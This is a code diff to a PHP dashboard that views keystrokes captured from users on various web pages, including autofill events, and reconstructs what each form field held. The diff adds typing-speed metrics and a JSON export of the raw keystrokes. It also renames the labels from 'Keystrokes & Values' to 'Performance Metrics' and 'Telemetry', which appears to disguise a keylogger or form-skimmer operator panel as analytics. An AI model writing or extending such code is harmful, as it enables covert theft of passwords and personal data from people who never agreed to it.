@@ -50,6 +50,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             --accent-green: #10b981;
             --accent-amber: #f59e0b;
             --accent-blue: #60a5fa;
+            --accent-purple: #a855f7;
             --code-bg: #030712;
             --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
         }
@@ -97,6 +98,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             display: inline-flex;
             align-items: center;
             justify-content: center;
+            gap: 6px;
             padding: 8px 16px;
             background-color: var(--primary);
             color: #ffffff;
@@ -261,6 +263,25 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             font-weight: 500;
         }
 
+        .metric-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            color: var(--text-main);
+            font-family: var(--font-mono);
+        }
+
+        .metric-pill.highlight {
+            color: var(--accent-green);
+            border-color: rgba(16, 185, 129, 0.4);
+            background: rgba(16, 185, 129, 0.1);
+        }
+
         /* Field Tabs */
         .field-tabs {
             display: flex;
@@ -323,7 +344,19 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             line-height: 1.7;
         }
 
-        .reconstructed-field-line {
+        .reconstructed-field-card {
+            background: #0b0f19;
+            border: 1px solid #1f2937;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+        }
+
+        .field-metrics-bar {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 6px;
             margin-bottom: 8px;
         }
 
@@ -335,10 +368,11 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         .reconstructed-value {
             color: #f3f4f6;
             background: #111827;
-            padding: 3px 10px;
-            border-radius: 4px;
-            margin-left: 8px;
+            padding: 6px 12px;
+            border-radius: 6px;
             border: 1px solid #1f2937;
+            display: block;
+            margin-top: 4px;
         }
 
         .keys-grid {
@@ -466,8 +500,9 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             <!-- Section 3: Input Fields & Keystrokes -->
             <div class="card" id="level-3-card" style="display: none;">
                 <div class="card-title">
-                    <span id="level-3-title">Keystrokes & Values</span>
-                    <div>
+                    <span id="level-3-title">Keystrokes & Performance Metrics</span>
+                    <div style="display: flex; gap: 8px;">
+                        <button class="btn btn-outline btn-sm" onclick="exportDataJson()">Export JSON</button>
                         <button class="btn btn-sm" id="btn-show-all-keys" onclick="selectAllFieldsKeys()">Show All Keys</button>
                         <button class="btn btn-outline btn-sm" onclick="showLevel(2)">Back to Pages</button>
                     </div>
@@ -480,10 +515,10 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
                     <!-- Dynamic tabs -->
                 </div>
 
-                <!-- Text Reconstruction -->
+                <!-- Text Reconstruction & Performance Metrics -->
                 <div class="terminal-box">
                     <div class="terminal-header">
-                        <span>Reconstructed Field Values</span>
+                        <span>Reconstructed Field Values & Performance Telemetry</span>
                         <span id="reconstruction-status" class="badge">Ready</span>
                     </div>
                     <div class="reconstructed-content" id="text-reconstruction"></div>
@@ -511,6 +546,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
     let selectedUserId = null;
     let selectedPageUrl = null;
     let selectedFieldId = 'all';
+    let currentLoadedKeys = [];
 
     document.addEventListener('DOMContentLoaded', function() {
         loadUsers();
@@ -616,7 +652,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
 
     function selectPage(pageUrl) {
         selectedPageUrl = pageUrl;
-        document.getElementById('level-3-title').innerText = `Keystrokes & Values on ${pageUrl}`;
+        document.getElementById('level-3-title').innerText = `Keystrokes & Performance on ${pageUrl}`;
         showLevel(3);
         loadFieldsAndKeys(selectedUserId, selectedPageUrl);
     }
@@ -665,7 +701,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         const countBadge = document.getElementById('keystroke-count');
 
         keysContainer.innerHTML = '<div class="loading">Fetching keystrokes...</div>';
-        textPreview.innerHTML = '<span class="loading">Processing reconstruction...</span>';
+        textPreview.innerHTML = '<span class="loading">Processing telemetry...</span>';
 
         let url = `api.php?action=get_keys&user_id=${encodeURIComponent(userId)}&page_url=${encodeURIComponent(pageUrl)}`;
         if (fieldId && fieldId !== 'all') {
@@ -677,6 +713,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             .then(data => {
                 if (data.status === 'success') {
                     const keys = data.keys || [];
+                    currentLoadedKeys = keys;
                     countBadge.innerText = `${keys.length} Keys`;
 
                     if (keys.length === 0) {
@@ -705,43 +742,68 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
                         `;
                     }).join('');
 
-                    // Precise text reconstruction per field without autofill collision
-                    const fieldValues = {};
-                    const fieldAutofillActive = {};
+                    // Precise text reconstruction & typing metrics per field
+                    const fieldStats = {};
 
                     keys.forEach(k => {
                         const fId = k.field_id;
-                        if (!fieldValues[fId]) {
-                            fieldValues[fId] = '';
-                            fieldAutofillActive[fId] = false;
+                        if (!fieldStats[fId]) {
+                            fieldStats[fId] = {
+                                value: '',
+                                autofillActive: false,
+                                minTs: k.timestamp,
+                                maxTs: k.timestamp,
+                                totalKeys: 0,
+                                backspaces: 0
+                            };
                         }
 
+                        const stat = fieldStats[fId];
+                        stat.totalKeys++;
+                        if (k.timestamp < stat.minTs) stat.minTs = k.timestamp;
+                        if (k.timestamp > stat.maxTs) stat.maxTs = k.timestamp;
+
                         if (k.key_code === 'Autofill') {
-                            if (!fieldAutofillActive[fId]) {
-                                fieldValues[fId] = '';
-                                fieldAutofillActive[fId] = true;
+                            if (!stat.autofillActive) {
+                                stat.value = '';
+                                stat.autofillActive = true;
                             }
-                            fieldValues[fId] += k.key_char;
+                            stat.value += k.key_char;
                         } else {
-                            fieldAutofillActive[fId] = false;
+                            stat.autofillActive = false;
                             if (k.key_char === 'Backspace') {
-                                fieldValues[fId] = fieldValues[fId].slice(0, -1);
+                                stat.backspaces++;
+                                stat.value = stat.value.slice(0, -1);
                             } else if (k.key_char === 'Enter') {
-                                fieldValues[fId] += '\n';
+                                stat.value += '\n';
                             } else if (k.key_char === 'Tab') {
-                                fieldValues[fId] += '\t';
+                                stat.value += '\t';
                             } else if (k.key_char && k.key_char.length === 1) {
-                                fieldValues[fId] += k.key_char;
+                                stat.value += k.key_char;
                             }
                         }
                     });
 
                     let reconstructionHtml = '';
-                    for (const [fId, val] of Object.entries(fieldValues)) {
-                        reconstructionHtml += `<div class="reconstructed-field-line">
-                            <span class="reconstructed-field-tag">[${escapeHtml(fId)}]:</span>
-                            <span class="reconstructed-value">${escapeHtml(val || '(empty)')}</span>
-                        </div>`;
+                    for (const [fId, stat] of Object.entries(fieldStats)) {
+                        const durationSec = Math.max(0.1, (stat.maxTs - stat.minTs) / 1000);
+                        const chars = stat.value.length;
+                        const wpm = Math.round((chars / 5) / (durationSec / 60)) || 0;
+                        const accuracy = Math.max(0, Math.round(((stat.totalKeys - stat.backspaces) / Math.max(1, stat.totalKeys)) * 100));
+
+                        reconstructionHtml += `
+                            <div class="reconstructed-field-card">
+                                <span class="reconstructed-field-tag">[${escapeHtml(fId)}]:</span>
+                                <div class="field-metrics-bar">
+                                    <span class="metric-pill highlight">Speed: ${wpm} WPM</span>
+                                    <span class="metric-pill">Accuracy: ${accuracy}%</span>
+                                    <span class="metric-pill">Time: ${durationSec.toFixed(1)}s</span>
+                                    <span class="metric-pill">Keys: ${stat.totalKeys}</span>
+                                    ${stat.backspaces > 0 ? `<span class="metric-pill" style="color:#fca5a5;">Fixes: ${stat.backspaces}</span>` : ''}
+                                </div>
+                                <span class="reconstructed-value">${escapeHtml(stat.value || '(empty)')}</span>
+                            </div>
+                        `;
                     }
 
                     textPreview.innerHTML = reconstructionHtml || 'Input is empty.';
@@ -752,6 +814,30 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             .catch(err => {
                 keysContainer.innerHTML = `<div class="error">Error connecting to server.</div>`;
             });
+    }
+
+    function exportDataJson() {
+        if (!currentLoadedKeys || currentLoadedKeys.length === 0) {
+            alert('No data to export.');
+            return;
+        }
+
+        const report = {
+            user_id: selectedUserId,
+            page_url: selectedPageUrl,
+            field_filter: selectedFieldId,
+            exported_at: new Date().toISOString(),
+            total_keystrokes: currentLoadedKeys.length,
+            keystrokes: currentLoadedKeys
+        };
+
+        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `performance_${selectedUserId || 'user'}_${Date.now()}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
     }
 
     function escapeHtml(str) {
